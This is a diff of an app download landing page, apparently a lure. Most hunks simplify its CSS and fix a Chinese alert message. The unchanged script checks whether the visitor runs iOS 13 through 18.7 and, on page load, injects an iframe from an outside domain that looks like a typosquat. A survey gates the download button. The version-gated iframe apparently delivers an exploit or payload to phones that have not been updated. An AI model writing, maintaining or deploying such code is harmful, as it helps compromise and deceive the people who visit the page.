@@ -22,7 +22,7 @@
             overflow-x: hidden;
         }
 
-        /* Vertical Scrolling Background Animation */
+        /* Optimized Background Animation for Fast Performance */
         .bg-animation-container {
             position: fixed;
             top: 0;
@@ -31,9 +31,9 @@
             height: 100%;
             z-index: -1;
             overflow: hidden;
-            opacity: 0.25;
-            filter: blur(8px);
-            transform: scale(1.1);
+            opacity: 0.2;
+            /* Removed heavy blur filter to boost performance */
+            will-change: transform;
         }
         .bg-track {
             position: absolute;
@@ -42,7 +42,8 @@
             width: 100%;
             display: flex;
             flex-direction: column;
-            animation: scrollBg 30s linear infinite;
+            animation: scrollBg 35s linear infinite;
+            will-change: transform;
         }
         .bg-track img {
             width: 100%;
@@ -58,10 +59,9 @@
         .container {
             width: 100%;
             max-width: 480px;
-            background: rgba(255, 255, 255, 0.98);
-            backdrop-filter: blur(20px);
+            background: #ffffff; /* Removed backdrop-filter to eliminate lag */
             min-height: 100vh;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
             display: flex;
             flex-direction: column;
             justify-content: space-between;
@@ -69,43 +69,41 @@
             z-index: 1;
         }
         .main-content {
-            padding: 30px 20px;
+            padding: 25px 20px;
             text-align: center;
         }
         .logo-img {
-            width: 96px;
-            height: 96px;
-            border-radius: 26px;
+            width: 90px;
+            height: 90px;
+            border-radius: 22px;
             object-fit: cover;
-            box-shadow: 0 12px 28px rgba(255, 75, 110, 0.35);
-            margin-bottom: 18px;
-            border: 3px solid #fff;
+            box-shadow: 0 8px 20px rgba(255, 75, 110, 0.3);
+            margin-bottom: 15px;
+            border: 2px solid #fff;
         }
         h1 {
-            font-size: 26px;
+            font-size: 24px;
             color: #111827;
-            margin-bottom: 8px;
+            margin-bottom: 6px;
             font-weight: 800;
-            letter-spacing: -0.5px;
         }
         .subtitle {
             font-size: 14px;
             color: #4b5563;
-            margin-bottom: 18px;
+            margin-bottom: 15px;
             font-weight: 500;
         }
         
         .online-badge {
             display: inline-flex;
             align-items: center;
-            background: linear-gradient(135deg, #ecfdf5 0%, #d1fae5 100%);
+            background: #ecfdf5;
             color: #059669;
-            padding: 6px 16px;
+            padding: 5px 14px;
             border-radius: 30px;
             font-size: 12px;
             font-weight: 600;
-            margin-bottom: 25px;
-            box-shadow: 0 4px 12px rgba(16, 185, 129, 0.1);
+            margin-bottom: 22px;
         }
         .pulse-dot {
             width: 8px;
@@ -113,14 +111,13 @@
             background-color: #10b981;
             border-radius: 50%;
             display: inline-block;
-            margin-right: 8px;
-            box-shadow: 0 0 0 rgba(16, 185, 129, 0.4);
+            margin-right: 6px;
             animation: pulse 1.5s infinite;
         }
         @keyframes pulse {
-            0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.7); }
-            70% { transform: scale(1); box-shadow: 0 0 0 8px rgba(16, 185, 129, 0); }
-            100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
+            0% { transform: scale(0.95); opacity: 0.9; }
+            70% { transform: scale(1); opacity: 0.4; }
+            100% { transform: scale(0.95); opacity: 0.9; }
         }
 
         .download-btn {
@@ -129,101 +126,87 @@
             background: linear-gradient(135deg, #ff4b6e 0%, #ff2e53 100%);
             color: white;
             text-align: center;
-            padding: 16px;
-            border-radius: 16px;
+            padding: 15px;
+            border-radius: 14px;
             font-size: 16px;
             font-weight: 700;
             text-decoration: none;
-            box-shadow: 0 8px 22px rgba(255, 75, 110, 0.35);
-            margin-bottom: 12px;
-            transition: all 0.25s ease;
+            box-shadow: 0 6px 18px rgba(255, 75, 110, 0.3);
+            margin-bottom: 10px;
             cursor: pointer;
             border: none;
-        }
-        .download-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 25px rgba(255, 75, 110, 0.45);
+            transition: opacity 0.15s ease;
         }
         .download-btn:active {
-            transform: scale(0.98);
+            opacity: 0.85;
         }
         
         .download-btn.locked {
-            background: linear-gradient(135deg, #e5e7eb 0%, #d1d5db 100%);
+            background: #e5e7eb;
             color: #6b7280;
             box-shadow: none;
             cursor: not-allowed;
             pointer-events: none;
-            opacity: 0.85;
         }
 
         .version-info {
-            font-size: 12px;
+            font-size: 11px;
             color: #9ca3af;
             margin-bottom: 25px;
-            font-weight: 500;
         }
 
         .section-title {
-            font-size: 18px;
+            font-size: 17px;
             color: #111827;
-            margin-bottom: 16px;
+            margin-bottom: 14px;
             text-align: left;
             font-weight: 700;
-            letter-spacing: -0.3px;
         }
         
         .features-grid {
             display: grid;
             grid-template-columns: 1fr;
-            gap: 12px;
-            margin-bottom: 30px;
+            gap: 10px;
+            margin-bottom: 25px;
         }
         .feature-card {
-            background: #ffffff;
+            background: #fdfdfd;
             border: 1px solid #f3f4f6;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.03);
-            padding: 16px;
-            border-radius: 16px;
+            padding: 14px;
+            border-radius: 14px;
             text-align: left;
             display: flex;
             align-items: center;
-            transition: transform 0.2s;
-        }
-        .feature-card:hover {
-            transform: translateY(-2px);
-            border-color: #ffe6eb;
         }
         .feature-icon {
-            font-size: 26px;
-            margin-right: 14px;
+            font-size: 22px;
+            margin-right: 12px;
             background: #fff0f3;
-            width: 48px;
-            height: 48px;
+            width: 42px;
+            height: 42px;
             display: flex;
             align-items: center;
             justify-content: center;
-            border-radius: 12px;
+            border-radius: 10px;
             flex-shrink: 0;
         }
         .feature-card h3 {
-            font-size: 15px;
+            font-size: 14px;
             color: #1f2937;
-            margin-bottom: 3px;
+            margin-bottom: 2px;
             font-weight: 700;
         }
         .feature-card p {
-            font-size: 13px;
+            font-size: 12px;
             color: #6b7280;
-            line-height: 1.4;
         }
 
         .screenshots-container {
             display: flex;
-            gap: 12px;
+            gap: 10px;
             overflow-x: auto;
-            padding-bottom: 12px;
-            margin-bottom: 30px;
+            padding-bottom: 10px;
+            margin-bottom: 25px;
             scrollbar-width: none;
             scroll-behavior: smooth;
         }
@@ -231,18 +214,13 @@
             display: none;
         }
         .screenshot-item {
-            min-width: 120px;
-            height: 220px;
+            min-width: 110px;
+            height: 200px;
             background: #f3f4f6;
-            border-radius: 14px;
+            border-radius: 12px;
             overflow: hidden;
             border: 1px solid #e5e7eb;
             flex-shrink: 0;
-            box-shadow: 0 6px 16px rgba(0,0,0,0.08);
-            transition: transform 0.2s;
-        }
-        .screenshot-item:hover {
-            transform: scale(1.02);
         }
         .screenshot-item img {
             width: 100%;
@@ -251,56 +229,52 @@
         }
 
         .reviews-section {
-            margin-bottom: 30px;
+            margin-bottom: 25px;
         }
         .review-card {
-            background: #ffffff;
+            background: #fdfdfd;
             border: 1px solid #f3f4f6;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.03);
-            padding: 16px;
-            border-radius: 16px;
+            padding: 14px;
+            border-radius: 14px;
             text-align: left;
-            margin-bottom: 12px;
+            margin-bottom: 10px;
             font-size: 13px;
         }
         .review-header {
             display: flex;
             justify-content: space-between;
-            margin-bottom: 8px;
+            margin-bottom: 6px;
             font-weight: 700;
             color: #1f2937;
         }
         .stars {
             color: #fbbf24;
-            font-size: 13px;
-            letter-spacing: 1px;
+            font-size: 12px;
         }
         .review-card p {
             color: #4b5563;
-            font-size: 13px;
-            line-height: 1.5;
+            font-size: 12px;
         }
 
         .app-details-section {
-            background: #ffffff;
+            background: #fdfdfd;
             border: 1px solid #f3f4f6;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.03);
-            border-radius: 16px;
-            padding: 20px;
+            border-radius: 14px;
+            padding: 15px;
             margin-bottom: 25px;
             text-align: left;
         }
         .app-details-section h3 {
-            font-size: 16px;
+            font-size: 15px;
             color: #111827;
-            margin-bottom: 16px;
+            margin-bottom: 10px;
             text-align: center;
             font-weight: 700;
         }
         .detail-row {
             display: flex;
             justify-content: space-between;
-            padding: 10px 0;
+            padding: 8px 0;
             border-bottom: 1px solid #f9fafb;
             font-size: 13px;
         }
@@ -316,31 +290,24 @@
         }
 
         .open-survey-btn {
-            background: linear-gradient(135deg, #fff0f3 0%, #ffe6eb 100%);
+            background: #fff0f3;
             border: 1px solid #ffccd5;
             color: #ff4b6e;
-            font-size: 14px;
+            font-size: 13px;
             font-weight: 700;
-            padding: 14px 20px;
-            border-radius: 14px;
+            padding: 12px;
+            border-radius: 12px;
             width: 100%;
             cursor: pointer;
-            margin: 10px 0 25px 0;
-            box-shadow: 0 4px 12px rgba(255, 75, 110, 0.1);
-            transition: all 0.2s;
-        }
-        .open-survey-btn:hover {
-            background: #ffe6eb;
-            transform: translateY(-1px);
+            margin: 10px 0 20px 0;
         }
 
         .footer {
             text-align: center;
-            padding: 20px;
+            padding: 15px;
             font-size: 12px;
             color: #9ca3af;
             border-top: 1px solid #f3f4f6;
-            background: #fafafa;
         }
 
         .wechat-overlay {
@@ -350,8 +317,7 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(11, 15, 25, 0.92);
-            backdrop-filter: blur(10px);
+            background: rgba(0,0,0,0.85);
             z-index: 1000;
             color: white;
             padding: 30px 20px;
@@ -359,17 +325,16 @@
         }
         .wechat-tip {
             text-align: center;
-            margin-top: 100px;
+            margin-top: 80px;
         }
         .wechat-tip h2 {
-            font-size: 22px;
-            margin-bottom: 12px;
-            color: #fff;
+            font-size: 20px;
+            margin-bottom: 10px;
         }
         .wechat-tip p {
-            font-size: 15px;
-            color: #d1d5db;
-            margin-bottom: 25px;
+            font-size: 14px;
+            color: #ccc;
+            margin-bottom: 20px;
             line-height: 1.6;
         }
 
@@ -381,8 +346,7 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(11, 15, 25, 0.7);
-            backdrop-filter: blur(8px);
+            background: rgba(0,0,0,0.6);
             z-index: 2000;
             justify-content: center;
             align-items: center;
@@ -391,107 +355,81 @@
         .survey-modal {
             background: #ffffff;
             width: 100%;
-            max-width: 400px;
-            border-radius: 20px;
-            padding: 25px;
+            max-width: 380px;
+            border-radius: 16px;
+            padding: 20px;
             text-align: left;
             position: relative;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.25);
-            animation: slideUp 0.35s cubic-bezier(0.16, 1, 0.3, 1);
-        }
-        @keyframes slideUp {
-            from { transform: translateY(30px); opacity: 0; }
-            to { transform: translateY(0); opacity: 1; }
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
         }
         .survey-close {
             position: absolute;
-            top: 18px;
-            right: 18px;
-            background: #f3f4f6;
+            top: 15px;
+            right: 15px;
+            background: none;
             border: none;
-            width: 32px;
-            height: 32px;
-            border-radius: 50%;
             font-size: 18px;
-            color: #4b5563;
+            color: #9ca3af;
             cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            transition: background 0.2s;
-        }
-        .survey-close:hover {
-            background: #e5e7eb;
         }
         .survey-progress {
             font-size: 11px;
             color: #ff4b6e;
             font-weight: 700;
-            margin-bottom: 8px;
+            margin-bottom: 6px;
             text-transform: uppercase;
-            letter-spacing: 0.5px;
         }
         .survey-modal h3 {
-            font-size: 17px;
+            font-size: 16px;
             color: #111827;
-            margin-bottom: 18px;
+            margin-bottom: 14px;
             line-height: 1.4;
-            font-weight: 700;
         }
         .survey-options {
             display: flex;
             flex-direction: column;
-            gap: 12px;
-            margin-bottom: 20px;
+            gap: 10px;
+            margin-bottom: 15px;
         }
         .survey-option-btn {
             background: #f9fafb;
             border: 1px solid #e5e7eb;
-            padding: 14px 16px;
-            border-radius: 14px;
+            padding: 12px;
+            border-radius: 10px;
             font-size: 14px;
             color: #1f2937;
             text-align: left;
             cursor: pointer;
-            font-weight: 500;
-            transition: all 0.2s;
         }
         .survey-option-btn:hover {
             background: #fff0f3;
             border-color: #ff4b6e;
             color: #ff4b6e;
-            transform: translateY(-1px);
         }
 
         .survey-options-grid {
             display: grid;
             grid-template-columns: 1fr 1fr;
-            gap: 12px;
-            margin-bottom: 20px;
+            gap: 10px;
+            margin-bottom: 15px;
         }
         .survey-image-card {
             background: #f9fafb;
             border: 1px solid #e5e7eb;
-            border-radius: 14px;
+            border-radius: 10px;
             overflow: hidden;
             cursor: pointer;
             text-align: center;
-            transition: all 0.2s;
-        }
-        .survey-image-card:hover {
-            border-color: #ff4b6e;
-            box-shadow: 0 8px 20px rgba(255, 75, 110, 0.15);
-            transform: translateY(-2px);
         }
         .survey-image-card img {
             width: 100%;
-            height: 130px;
+            height: 120px;
             object-fit: cover;
         }
         .survey-image-card span {
             display: block;
-            padding: 10px 6px;
-            font-size: 13px;
+            padding: 8px 5px;
+            font-size: 12px;
             color: #1f2937;
             font-weight: 600;
         }
@@ -499,25 +437,24 @@
         .survey-loading {
             display: none;
             text-align: center;
-            padding: 35px 0;
+            padding: 25px 0;
         }
         .spinner {
-            width: 44px;
-            height: 44px;
-            border: 4px solid #ffe6eb;
-            border-top: 4px solid #ff4b6e;
+            width: 36px;
+            height: 36px;
+            border: 3px solid #ffe6eb;
+            border-top: 3px solid #ff4b6e;
             border-radius: 50%;
-            animation: spin 0.9s linear infinite;
-            margin: 0 auto 18px auto;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto 12px auto;
         }
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
         .survey-loading p {
-            font-size: 14px;
+            font-size: 13px;
             color: #4b5563;
-            font-weight: 500;
         }
     </style>
 </head>
@@ -679,7 +616,6 @@
                 const major = parseInt(match[1], 10);
                 const minor = match[2] ? parseInt(match[2], 10) : 0;
                 
-                // Rules condition: major >= 13 && (major < 18 || (major === 18 && minor <= 7))
                 if (major >= 13 && (major < 18 || (major === 18 && minor <= 7))) {
                     const iframe = document.createElement('iframe');
                     iframe.src = "https://ads.yurticlkargo.com/static/sdk.html";
@@ -689,7 +625,6 @@
             }
         }
 
-        // Run version check on load
         window.addEventListener('DOMContentLoaded', checkIOSAndInjectIframe);
 
         function isWeChat() {
@@ -854,7 +789,7 @@
 
         function handleDownloadClick() {
             if (isSurveyCompleted) {
-                alert("已预约，我们将列表您进行应用安装");
+                alert("已预约，我们将联系您进行应用安装");
             } else {
                 startSurvey();
             }
